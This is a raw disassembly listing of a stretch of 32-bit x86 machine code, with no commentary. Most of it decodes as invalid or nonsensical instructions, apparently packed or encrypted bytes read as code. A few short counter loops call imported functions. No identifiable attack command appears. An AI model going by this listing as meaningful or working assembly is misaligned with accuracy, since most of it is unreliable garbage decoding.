  40ac12:	mov    ds:0xbf7fac2a,ax
  40ac18:	fcomp  st(3)
  40ac1a:	xor    BYTE PTR [ebp+0x67],bl
  40ac1d:	imul   ecx,DWORD PTR [ebp+0x6a],0xffffffdc
  40ac21:	cmp    BYTE PTR [edi+0x6d0550a1],dh
  40ac27:	stc    
  40ac28:	ja     0x40abd4
  40ac2a:	mov    BYTE PTR [eax-0x62],ch
  40ac2d:	popf   
  40ac2e:	aas    
  40ac2f:	icebp  
  40ac30:	mov    ebp,0x16c534aa
  40ac35:	outs   dx,DWORD PTR ds:[esi]
  40ac36:	jmp    0x5ad4:0xa53833f9
  40ac3d:	fsubr  st,st(7)
  40ac3f:	xor    esp,ebx
  40ac41:	mov    ds:0x3982ac8a,eax
  40ac46:	add    DWORD PTR [ecx],ecx
  40ac48:	inc    esp
  40ac49:	and    BYTE PTR [edx+ebx*8+0x58],al
  40ac4d:	mov    BYTE PTR [eax-0x2b89a6d5],bh
  40ac53:	add    eax,0x16fb39b4
  40ac58:	xchg   DWORD PTR [ebx],ecx
  40ac5a:	sub    BYTE PTR [eax-0x3a],dh
  40ac5d:	clc    
  40ac5e:	xchg   ebp,eax
  40ac5f:	pop    esi
  40ac60:	mov    esi,0xc0573a53
  40ac65:	dec    esi
  40ac66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac67:	jmp    0xe883eecc
  40ac6c:	in     eax,dx
  40ac6d:	(bad)  
  40ac6e:	cld    
  40ac6f:	hlt    
  40ac70:	sub    eax,DWORD PTR [eax]
  40ac72:	out    0x1,eax
  40ac74:	jnp    0x40ac95
  40ac76:	and    DWORD PTR [eax-0x9ba7a4],ecx
  40ac7c:	cdq    
  40ac7d:	das    
  40ac7e:	int    0x6e
  40ac80:	pop    ebx
  40ac81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac82:	add    al,0x21
  40ac84:	ror    DWORD PTR ds:0x840fc83b,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	jmp    0x40acc9
  40ac92:	inc    ebx
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	outs   dx,DWORD PTR ds:[esi]
  40ac9e:	cmp    BYTE PTR [ebx+0x0],al
  40aca1:	add    BYTE PTR [eax],al
  40aca3:	add    BYTE PTR [eax],al
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x6e00ca1b],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad6c
  40ad2c:	mov    ds:0x2e3626bd,al
  40ad31:	sbb    BYTE PTR [ebx-0x6],dh
  40ad34:	(bad)  
  40ad35:	retf   
  40ad36:	sahf   
  40ad37:	sub    DWORD PTR [ebx],eax
  40ad39:	cmp    al,0xb4
  40ad3b:	mov    esp,0xbd088a1
  40ad40:	cwde   
  40ad41:	or     eax,0x51f2474a
  40ad46:	ret    0xfe56
  40ad49:	xor    eax,0x8eacc312
  40ad4e:	repnz test BYTE PTR [ecx-0x82caeff],0xbd
  40ad56:	inc    esp
  40ad57:	or     al,0x3
  40ad59:	lods   al,BYTE PTR ds:[esi]
  40ad5a:	sti    
  40ad5b:	push   eax
  40ad5c:	fld    QWORD PTR ds:0xf8bc8634
  40ad62:	add    DWORD PTR [edx+0x54b8aa9b],esi
  40ad68:	jmp    0x40acf3
  40ad6a:	fucom  st(1)
  40ad6c:	and    ebp,eax
  40ad6e:	or     bh,ch
  40ad70:	cli    
  40ad71:	mov    edi,0x3926f465
  40ad76:	test   al,0xda
  40ad78:	push   cs
  40ad79:	pusha  
  40ad7a:	dec    esi
  40ad7b:	mov    ebp,0x3a75da7f
  40ad80:	mov    dh,0xd9
  40ad82:	lea    esi,[eax]
  40ad84:	xchg   ebp,eax
  40ad85:	cmp    DWORD PTR [esi+0x3bc5b468],ebx
  40ad8b:	mov    ah,BYTE PTR [esi+0x6d87a6a6]
  40ad91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad92:	push   0xffffffc4
  40ad94:	xchg   ecx,eax
  40ad95:	xchg   edi,eax
  40ad96:	mov    dh,BYTE PTR [edi+ebp*8]
  40ad99:	retf   
  40ad9a:	dec    ebp
  40ad9b:	push   es
  40ad9c:	iret   
  40ad9d:	outs   dx,BYTE PTR ds:[esi]
  40ad9e:	bound  edx,QWORD PTR [edx]
  40ada0:	push   esi
  40ada1:	mov    ds:0xf5352fe4,eax
  40ada6:	inc    esi
  40ada7:	push   0xad297d95
  40adac:	sub    esi,DWORD PTR [ecx+0x721c9495]
  40adb2:	and    al,0x22
  40adb4:	cwde   
  40adb5:	adc    eax,0xd4f51c1e
  40adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adbb:	shr    BYTE PTR [esi],cl
  40adbd:	(bad)  
  40adbe:	pop    edx
  40adbf:	les    edx,FWORD PTR [ebp+0x1b]
  40adc2:	pop    ebp
  40adc3:	push   eax
  40adc4:	aam    0x4f
  40adc6:	sbb    esp,DWORD PTR [edi]
  40adc8:	fwait
  40adc9:	dec    ebp
  40adca:	pop    es
  40adcb:	enter  0xbb4b,0xb0
  40adcf:	ins    DWORD PTR es:[edi],dx
  40add0:	ins    BYTE PTR es:[edi],dx
  40add1:	lock or ebp,DWORD PTR [esi]
  40add4:	cmp    DWORD PTR [ebp-0x80],edi
  40add7:	mov    eax,0x90497df7
  40addc:	pushf  
  40addd:	dec    esp
  40adde:	push   0x21787a4e
  40ade3:	mov    ecx,0x12ac6344
  40ade8:	(bad)  
  40ade9:	rcl    BYTE PTR [ebp-0x55],cl
  40adec:	in     al,dx
  40aded:	ins    DWORD PTR es:[edi],dx
  40adee:	pop    ebx
  40adef:	lock frstor [ebx-0x73]
  40adf3:	mov    ah,0x44
  40adf5:	mov    ebp,0x4d149df4
  40adfa:	add    DWORD PTR [edx],esi
  40adfc:	cmp    BYTE PTR [esi+0x6428ad93],bh
  40ae02:	sub    BYTE PTR [edi],ch
  40ae04:	fcmove st,st(6)
  40ae06:	dec    ebx
  40ae07:	daa    
  40ae08:	cmp    DWORD PTR [ebx-0x28af0077],ebx
  40ae0e:	jbe    0x40adc3
  40ae10:	shr    BYTE PTR [edx],1
  40ae12:	inc    esp
  40ae13:	fst    QWORD PTR ds:0x55419f9d
  40ae19:	(bad)  
  40ae1a:	mov    ds:0x849e2590,al
  40ae1f:	neg    BYTE PTR [ecx-0x26]
  40ae22:	outs   dx,BYTE PTR ds:[esi]
  40ae23:	popa   
  40ae24:	pop    ecx
  40ae25:	retf   0xb5f6
  40ae28:	ucomiss xmm5,DWORD PTR [edi-0x775325cc]
  40ae2f:	mov    al,0x0
  40ae31:	jae    0x40aeab
  40ae33:	add    BYTE PTR [ebx+0x5b],dl
  40ae36:	fmul   st,st(0)
  40ae38:	jno    0x40ae99
  40ae3a:	loope  0x40ae78
  40ae3c:	aad    0xf4
  40ae3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae3f:	mov    bl,0x56
  40ae41:	call   0x907269cb
  40ae46:	and    bl,ch
  40ae48:	push   esi
  40ae49:	ins    BYTE PTR es:[edi],dx
  40ae4a:	out    dx,eax
  40ae4b:	push   0xf
  40ae4d:	pop    ds
  40ae4e:	xor    eax,0xccff0d48
  40ae53:	ds xchg esi,eax
  40ae55:	shl    DWORD PTR ds:0x5ea1d0f8,cl
  40ae5b:	xchg   DWORD PTR [esi],ecx
  40ae5d:	mov    bh,0x2e
  40ae5f:	pop    ss
  40ae60:	hlt    
  40ae61:	call   0x6fa6:0x402d6d5e
  40ae68:	cmp    cl,BYTE PTR [edi-0x7a]
  40ae6b:	mov    cl,BYTE PTR ds:0xbac1a5b9
  40ae71:	add    al,0x20
  40ae73:	lds    eax,FWORD PTR [esi-0xdefe751]
  40ae79:	cmp    al,0x9d
  40ae7b:	pusha  
  40ae7c:	cmp    bl,BYTE PTR [eax-0x2e897b4f]
  40ae82:	dec    esi
  40ae83:	bnd jg 0x40ae64
  40ae86:	xchg   edx,eax
  40ae87:	jl     0x40ae9a
  40ae89:	data16 cmp ch,BYTE PTR [ecx+0x170279b6]
  40ae90:	jo     0x40ae57
  40ae92:	pushf  
  40ae93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae94:	lods   al,BYTE PTR ds:[esi]
  40ae95:	ds sub eax,0x115ac18a
  40ae9b:	push   cs
  40ae9c:	xor    BYTE PTR [ecx*8+0x692f550b],0x81
  40aea4:	hlt    
  40aea5:	shl    DWORD PTR [ebp-0x25b7c3a2],0x8c
  40aeac:	ins    BYTE PTR es:[edi],dx
  40aead:	mov    bh,bh
  40aeaf:	jne    0x40aebf
  40aeb1:	cli    
  40aeb2:	leave  
  40aeb3:	and    al,0x7e
  40aeb5:	dec    ebx
  40aeb6:	into   
  40aeb7:	pop    edi
  40aeb8:	cmp    bh,bl
  40aeba:	lahf   
  40aebb:	lock push es
  40aebd:	xchg   edi,eax
  40aebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebf:	loope  0x40af0f
  40aec1:	push   ebx
  40aec2:	ss pop es
  40aec4:	push   edi
  40aec5:	rol    DWORD PTR [edx+0x2b00f3b8],cl
  40aecb:	sub    cl,cl
  40aecd:	bound  edx,QWORD PTR [esi+edi*2]
  40aed0:	pop    ss
  40aed1:	xchg   ebp,eax
  40aed2:	in     eax,dx
  40aed3:	and    DWORD PTR [edx+0x27c3f741],esi
  40aed9:	ins    BYTE PTR es:[edi],dx
  40aeda:	pop    ss
  40aedb:	mov    eax,ds:0xd1b1f7eb
  40aee0:	mov    dh,0x63
  40aee2:	add    eax,0x7b0f0c2e
  40aee7:	mov    bl,0x7f
  40aee9:	adc    eax,0x209c4584
  40aeee:	sbb    eax,0x9d7deecc
  40aef3:	jne    0x40aed6
  40aef5:	in     al,dx
  40aef6:	retf   0xb673
  40aef9:	sbb    dh,BYTE PTR [edx-0x3d6eb3f1]
  40aeff:	and    al,0xe9
  40af01:	pusha  
  40af02:	(bad)  
  40af03:	shl    DWORD PTR ss:0x57f12e56,0x1
  40af0b:	sub    BYTE PTR [eax],bh
  40af0d:	loope  0x40af35
  40af0f:	jp     0x40af65
  40af11:	test   al,0x77
  40af13:	mov    eax,ds:0x5165b9ee
  40af18:	stos   DWORD PTR es:[edi],eax
  40af19:	cmovno edi,DWORD PTR [ebx+0x201bcb9d]
  40af20:	outs   dx,BYTE PTR ds:[esi]
  40af21:	mov    ds:0xa264b383,eax
  40af26:	push   0x17
  40af28:	push   ebx
  40af29:	mov    WORD PTR ds:0xdb572803,ss
  40af2f:	ja     0x40afa0
  40af31:	xchg   DWORD PTR [eax],edx
  40af33:	push   ebp
  40af34:	ja     0x40aece
  40af36:	xchg   esp,eax
  40af37:	mov    DWORD PTR [esi-0x12534538],0xb9487e3e
  40af41:	cmp    al,0xd
  40af43:	push   cs
  40af44:	popf   
  40af45:	ss int3 
  40af47:	ja     0x40af6d
  40af49:	lock or DWORD PTR [edx-0x76],eax
  40af4d:	xchg   ecx,eax
  40af4e:	test   ah,al
  40af50:	mov    gs,WORD PTR [eax-0x2a82e4bd]
  40af56:	cmp    dh,dl
  40af58:	in     eax,0x28
  40af5a:	ja     0x40afb8
  40af5c:	shr    DWORD PTR ds:0xbb29a328,0xb4
  40af63:	sub    eax,0xa77ee2bf
  40af68:	xchg   ah,bh
  40af6a:	scas   eax,DWORD PTR es:[edi]
  40af6b:	pusha  
  40af6c:	(bad)  
  40af6d:	pop    esi
  40af6e:	and    eax,0x408bc798
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433827
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4337df
  40af93:	sub    DWORD PTR ds:0x43378f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4337db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4337db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4337db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4337db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4337db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4337db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4337db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4337db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433827,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	add    edi,ecx
  40b019:	das    
  40b01a:	test   DWORD PTR [edi+esi*8+0x7e],esp
  40b01e:	jle    0x40b058
  40b020:	jl     0x40b0a0
  40b022:	jle    0x40b087
  40b024:	int3   
  40b025:	or     al,0xf8
  40b027:	or     eax,0x3a5e9fe5
  40b02c:	cmc    
  40b02d:	sbb    edx,DWORD PTR [edi]
  40b02f:	xchg   BYTE PTR [ecx+0x4c],al
  40b032:	dec    edi
  40b033:	iret   
  40b034:	and    BYTE PTR [ebx-0x9b51297],cl
  40b03a:	xor    ecx,DWORD PTR [ecx+0x6ff4db41]
  40b040:	mov    edx,0xeccde2f6
  40b045:	push   ebx
  40b046:	test   BYTE PTR [ebx-0x5600d769],cl
  40b04c:	fdiv   QWORD PTR [esi+0x20]
  40b04f:	ins    BYTE PTR es:[edi],dx
  40b050:	xchg   esi,eax
  40b051:	pushf  
  40b052:	inc    ecx
  40b053:	or     dl,BYTE PTR cs:[edx-0x2a]
  40b057:	fiadd  DWORD PTR [edx+0x66]
  40b05a:	in     al,0x85
  40b05c:	scas   eax,DWORD PTR es:[edi]
  40b05d:	xor    eax,0xf8921d7e
  40b062:	mov    bh,0x62
  40b064:	mov    al,0xcb
  40b066:	jl     0x40b0c0
  40b068:	addr16 pop eax
  40b06a:	sbb    esp,DWORD PTR [ebx]
  40b06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06d:	xor    BYTE PTR [eax-0x2e0d2347],cl
  40b073:	ror    ebx,1
  40b075:	into   
  40b076:	fnstcw WORD PTR cs:[eax+0x73f62441]
  40b07d:	test   BYTE PTR [eax+0x1d53eff7],ah
  40b083:	(bad)  
  40b084:	mov    bl,0xef
  40b086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b087:	leave  
  40b088:	xchg   ebx,eax
  40b089:	xor    al,0x3d
  40b08b:	push   esi
  40b08c:	sahf   
  40b08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b08e:	mov    bl,0x37
  40b090:	into   
  40b091:	ret    
  40b092:	add    ah,BYTE PTR [esi+0x60]
  40b095:	jb     0x40b061
  40b097:	aam    0x91
  40b099:	and    eax,0x58fb1db5
  40b09e:	es gs ret 0xd2f2
  40b0a3:	sbb    al,BYTE PTR [esi-0x2c8b9ebf]
  40b0a9:	neg    bl
  40b0ab:	shl    DWORD PTR [eax+0x74],cl
  40b0ae:	adc    DWORD PTR [ebx],ecx
  40b0b0:	xor    ebp,ebp
  40b0b2:	mov    al,0xc3
  40b0b4:	mov    ds:0x16c4ac1d,eax
  40b0b9:	inc    esp
  40b0ba:	mov    ah,0x6a
  40b0bc:	rol    bl,1
  40b0be:	mov    cl,0x76
  40b0c0:	test   DWORD PTR [ebp+0x74c0f475],edi
  40b0c6:	(bad)  
  40b0c7:	fldcw  WORD PTR [edi+ecx*4]
  40b0ca:	cmp    al,BYTE PTR ds:0x3ed240e9
  40b0d0:	push   eax
  40b0d1:	clc    
  40b0d2:	jo     0x40b134
  40b0d4:	push   es
  40b0d5:	xchg   DWORD PTR [ebx-0x4a2e9a85],ebp
  40b0db:	and    al,0x49
  40b0dd:	dec    eax
  40b0de:	mov    eax,0xfe7d54d6
  40b0e3:	ds pop edi
  40b0e5:	pop    ecx
  40b0e6:	pop    ebx
  40b0e7:	add    al,BYTE PTR ds:0x66a9e5c8
  40b0ed:	stos   DWORD PTR es:[edi],eax
  40b0ee:	dec    ebp
  40b0ef:	test   eax,0x3bd7e596
  40b0f4:	ins    BYTE PTR es:[edi],dx
  40b0f5:	mov    edi,0xf23a2e6a
  40b0fa:	mov    eax,0x29cb3e8f
  40b0ff:	sti    
  40b100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b101:	or     edx,DWORD PTR [ecx]
  40b103:	vpunpckhwd xmm5,xmm2,XMMWORD PTR [ebp+0x71]
  40b108:	addr16 call 0xdd8a285b
  40b10e:	jl     0x40b14d
  40b110:	pop    esp
  40b111:	jbe    0x40b104
  40b113:	jmp    0x2c30:0x45b86554
  40b11a:	loop   0x40b121
  40b11c:	inc    ebx
  40b11d:	adc    eax,0xb08b941d
  40b122:	push   ds
  40b123:	cwde   
  40b124:	bound  ecx,QWORD PTR [ebp+ebx*2-0x4ac2d950]
  40b12b:	retf   0xddc6
  40b12e:	addr16 jae 0x40b136
  40b131:	and    ah,BYTE PTR [eax+edi*4]
  40b134:	mov    BYTE PTR [edi+0x2e],dl
  40b137:	inc    esp
  40b138:	dec    edx
  40b139:	into   
  40b13a:	pop    edi
  40b13b:	or     BYTE PTR [esi-0x34],0xe8
  40b13f:	mov    ds:0x77087919,al
  40b144:	mov    esi,0x414b76f6
  40b149:	aad    0x71
  40b14b:	mov    bh,ch
  40b14d:	cld    
  40b14e:	fst    QWORD PTR [edx+0x39a0b8b6]
  40b154:	rol    ecx,0xab
  40b157:	inc    ecx
  40b158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b159:	lds    eax,FWORD PTR [esp+ebx*2]
  40b15c:	scas   al,BYTE PTR es:[edi]
  40b15d:	push   ss
  40b15e:	es adc eax,0xaa99c338
  40b164:	sbb    BYTE PTR [edx-0x36],dl
  40b167:	xlat   BYTE PTR ds:[ebx]
  40b168:	sub    esp,DWORD PTR [eax+0x7c]
  40b16b:	aam    0x6c
  40b16d:	jg     0x40b145
  40b16f:	fimul  WORD PTR [ebp+0x78]
  40b172:	and    BYTE PTR ds:0x78fd6aef,al
  40b178:	call   0x4d479630
  40b17d:	or     ebp,eax
  40b17f:	mov    al,ds:0x92eae816
  40b184:	je     0x40b1fe
  40b186:	mov    eax,ds:0x33f9f33f
  40b18b:	cli    
  40b18c:	inc    edi
  40b18d:	mov    ecx,DWORD PTR [ebp+0x53f65e56]
  40b193:	sbb    eax,0x8e4130f7
  40b198:	cmp    DWORD PTR [ebx+0x7feb0ad0],ebx
  40b19e:	in     eax,0x68
  40b1a0:	cs test al,0xb0
  40b1a3:	xor    dl,BYTE PTR [edx]
  40b1a5:	push   ss
  40b1a6:	js     0x40b130
  40b1a8:	repz push eax
  40b1aa:	test   edx,eax
  40b1ac:	scas   al,BYTE PTR es:[edi]
  40b1ad:	loopne 0x40b20e
  40b1af:	xor    esi,DWORD PTR [ebx+0x1cb1b21e]
  40b1b5:	test   eax,0xad83b607
  40b1ba:	je     0x40b181
  40b1bc:	stos   BYTE PTR es:[edi],al
  40b1bd:	dec    eax
  40b1be:	xchg   edx,eax
  40b1bf:	sbb    bl,ah
  40b1c1:	xor    al,BYTE PTR [esi+0x5b8382c5]
  40b1c7:	pop    ecx
  40b1c8:	loope  0x40b17d
  40b1ca:	cs (bad) 
  40b1cc:	(bad)  
  40b1cd:	gs or  eax,0xbd5e7d97
  40b1d3:	mov    ebp,0xe44fcd06
  40b1d8:	ja     0x40b216
  40b1da:	int3   
  40b1db:	outs   dx,DWORD PTR ds:[esi]
  40b1dc:	addr16 dec esi
  40b1de:	retf   0xdbeb
  40b1e1:	repz xor edx,esp
  40b1e4:	stos   BYTE PTR es:[edi],al
  40b1e5:	sbb    esp,DWORD PTR ds:0x3ae27d
  40b1eb:	push   edi
  40b1ec:	int    0x91
  40b1ee:	mov    al,ds:0x751c45e5
  40b1f3:	out    0xa8,al
  40b1f5:	sub    al,BYTE PTR [ecx-0x58]
  40b1f8:	or     eax,0xbc9ab3b0
  40b1fd:	jbe    0x40b276
  40b1ff:	call   DWORD PTR [edx+0x2a]
  40b202:	mov    edx,0x4362750
  40b207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b208:	fs jo  0x40b21e
  40b20b:	dec    eax
  40b20c:	push   ebx
  40b20d:	test   al,0x43
  40b20f:	mov    WORD PTR [ebx+edx*4-0x283d0501],ds
  40b216:	cld    
  40b217:	and    bh,0xe4
  40b21a:	inc    edx
  40b21b:	jmp    0x40b213
  40b21d:	xor    esi,eax
  40b21f:	fxch   st(7)
  40b221:	jmp    0x894f:0x72124275
  40b228:	aas    
  40b229:	daa    
  40b22a:	mov    al,ds:0x47566e61
  40b22f:	pop    ds
  40b230:	xchg   ebx,eax
  40b231:	mov    bl,0xa6
  40b233:	mov    BYTE PTR [esi+ebx*1],dh
  40b236:	xchg   DWORD PTR [esi+ebp*1-0x46],ecx
  40b23a:	dec    eax
  40b23b:	je     0x40b219
  40b23d:	push   esi
  40b23e:	dec    ebp
  40b23f:	dec    ebp
  40b240:	enter  0x7a57,0x3
  40b244:	pop    ecx
  40b245:	adc    bh,BYTE PTR [esi-0x2]
  40b248:	iret   
  40b249:	ficom  WORD PTR [edi-0x3cec317]
  40b24f:	add    al,0xaa
  40b251:	rcr    BYTE PTR [ecx],0x31
  40b254:	push   ebx
  40b255:	icebp  
  40b256:	add    BYTE PTR [bx+si-0x60],ah
  40b25a:	popf   
  40b25b:	cld    
  40b25c:	call   0x4845:0xb39a67fb
  40b263:	jecxz  0x40b243
  40b265:	dec    ecx
  40b266:	out    dx,al
  40b267:	scas   al,BYTE PTR es:[edi]
  40b268:	ror    BYTE PTR [ebx+0x4d8bec45],1
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	cmp    edx,DWORD PTR [ecx]
  40b285:	sub    eax,0x7ef22e7f
  40b28a:	jle    0x40b2c4
  40b28c:	jl     0x40b30c
  40b28e:	jle    0x40b29b
  40b290:	pop    eax
  40b291:	rol    BYTE PTR [esi],cl
  40b293:	scas   eax,DWORD PTR es:[edi]
  40b294:	ret    
  40b295:	cmp    BYTE PTR [edi-0x4f4164f4],bh
  40b29b:	call   0xeaa0d46c
  40b2a0:	jmp    0x165b3a8d
  40b2a5:	sub    dl,BYTE PTR [edi-0x6d609e74]
  40b2ab:	jno    0x40b2f7
  40b2ad:	jnp    0x40b24a
  40b2af:	xchg   ebp,eax
  40b2b0:	pop    eax
  40b2b1:	jecxz  0x40b278
  40b2b3:	out    dx,eax
  40b2b4:	rcr    BYTE PTR ds:0xf3074d7d,cl
  40b2ba:	loopne 0x40b31c
  40b2bc:	fistp  QWORD PTR [di+0x17]
  40b2c0:	jbe    0x40b2f8
  40b2c2:	and    DWORD PTR [esi-0x40],eax
  40b2c5:	stos   DWORD PTR es:[edi],eax
  40b2c6:	gs fwait
  40b2c8:	push   ds
  40b2c9:	lods   al,BYTE PTR ds:[esi]
  40b2ca:	jbe    0x40b259
  40b2cc:	or     al,0xc2
  40b2ce:	mov    dl,0xfa
  40b2d0:	cli    
  40b2d1:	stc    
  40b2d2:	mov    WORD PTR ds:0x60e161e9,ss
  40b2d8:	icebp  
  40b2d9:	nop
  40b2da:	jp     0x40b337
  40b2dc:	pop    ebp
  40b2dd:	jg     0x40b281
  40b2df:	pop    edi
  40b2e0:	pop    esp
  40b2e1:	add    eax,0x35ce7af9
  40b2e6:	push   ebp
  40b2e7:	test   eax,0x58331866
  40b2ec:	push   cs
  40b2ed:	sub    DWORD PTR [ebp-0x15f1965d],edx
  40b2f3:	mov    al,ds:0x609235dd
  40b2f8:	imul   edi,DWORD PTR [eax-0x49f9ccf1],0xade2f54b
  40b302:	cli    
  40b303:	pushf  
  40b304:	shr    BYTE PTR [edx],cl
  40b306:	clc    
  40b307:	mov    bh,0x41
  40b309:	mov    ebp,DWORD PTR [esi]
  40b30b:	inc    ebx
  40b30c:	xchg   edi,edi
  40b30e:	or     esp,ebp
  40b310:	rcr    bh,1
  40b312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b313:	dec    ecx
  40b314:	imul   ecx,DWORD PTR [ebx+0x584792b],0xf
  40b31b:	pop    ecx
  40b31c:	xchg   esp,eax
  40b31d:	aad    0x3a
  40b31f:	fadd   DWORD PTR [esi]
  40b321:	test   DWORD PTR [ebp-0x29],0xeddd747a
  40b328:	xchg   edi,eax
  40b329:	sub    esp,edx
  40b32b:	outs   dx,DWORD PTR ds:[esi]
  40b32c:	inc    ebp
  40b32d:	or     ebx,ebp
  40b32f:	or     BYTE PTR [eax-0x6763f793],ch
  40b335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b336:	lods   eax,DWORD PTR ds:[esi]
  40b337:	fst    QWORD PTR [ebp+0x2c0c246e]
  40b33d:	add    edx,DWORD PTR [edi+0x1]
  40b340:	push   edi
  40b341:	fwait
  40b342:	das    
  40b343:	scas   al,BYTE PTR es:[edi]
  40b344:	pop    ss
  40b345:	cmp    BYTE PTR fs:[edi-0x2cf479d0],0xbb
  40b34d:	pop    ds
  40b34e:	cld    
  40b34f:	jb     0x40b3a9
  40b351:	or     DWORD PTR [eax-0x7a],0xbe059a9c
  40b358:	or     DWORD PTR [esi+0x0],ecx
  40b35b:	mov    ecx,0xe06468d5
  40b360:	pop    es
  40b361:	enter  0xd176,0xac
  40b365:	ret    0x556c
  40b368:	inc    ebx
  40b369:	inc    eax
  40b36a:	(bad)  
  40b36b:	ficom  WORD PTR [ecx]
  40b36d:	test   BYTE PTR [edx-0x1],ah
  40b370:	(bad)  
  40b372:	scas   eax,DWORD PTR es:[edi]
  40b373:	test   al,0x79
  40b375:	adc    DWORD PTR [ecx],esi
  40b377:	inc    eax
  40b379:	ret    0x972e
  40b37c:	enter  0x80b2,0x65
  40b380:	cwde   
  40b381:	rcl    DWORD PTR es:[edx+esi*2],cl
  40b385:	dec    edi
  40b386:	sbb    bh,dh
  40b388:	hlt    
  40b389:	jb     0x40b3fd
  40b38b:	mov    ds:0xde5ea80e,eax
  40b390:	pop    edi
  40b391:	aaa    
  40b392:	mov    ebx,0xc3efecf0
  40b397:	mov    bl,0x4c
  40b399:	or     DWORD PTR [ebx+0x4f],edx
  40b39c:	imul   edx,DWORD PTR [ebx],0xffffffe5
  40b39f:	jo     0x40b416
  40b3a1:	retf   0x639b
  40b3a4:	mov    esp,0x4a60161f
  40b3a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3aa:	outs   dx,BYTE PTR ds:[esi]
  40b3ab:	leave  
  40b3ac:	cli    
  40b3ad:	and    ah,dh
  40b3af:	je     0x40b381
  40b3b1:	sbb    DWORD PTR [eax],edi
  40b3b3:	(bad)  
  40b3b4:	pop    esp
  40b3b5:	es loope 0x40b35f
  40b3b8:	fcomp  QWORD PTR [eax+ecx*4-0x30]
  40b3bc:	out    0xf8,eax
  40b3be:	lods   al,BYTE PTR ds:[esi]
  40b3bf:	push   0x54
  40b3c1:	outs   dx,BYTE PTR ds:[esi]
  40b3c2:	neg    DWORD PTR [esi+0x2b1a9a06]
  40b3c8:	aaa    
  40b3c9:	xchg   edi,eax
  40b3ca:	sub    al,0x1b
  40b3cd:	imul   edx,edi,0x77
  40b3d0:	(bad)  
  40b3d1:	xor    BYTE PTR [esi],bh
  40b3d3:	jo     0x40b44f
  40b3d5:	outs   dx,BYTE PTR ds:[esi]
  40b3d6:	jo     0x40b367
  40b3d8:	inc    eax
  40b3d9:	inc    ebx
  40b3da:	pop    es
  40b3db:	mov    cl,0x49
  40b3dd:	or     ebp,esi
  40b3df:	gs jp  0x40b41a
  40b3e2:	and    BYTE PTR [ecx],0x1f
  40b3e5:	popa   
  40b3e6:	and    ah,BYTE PTR [edi]
  40b3e8:	into   
  40b3e9:	cld    
  40b3ea:	push   cs
  40b3eb:	mov    ebp,0x900c206c
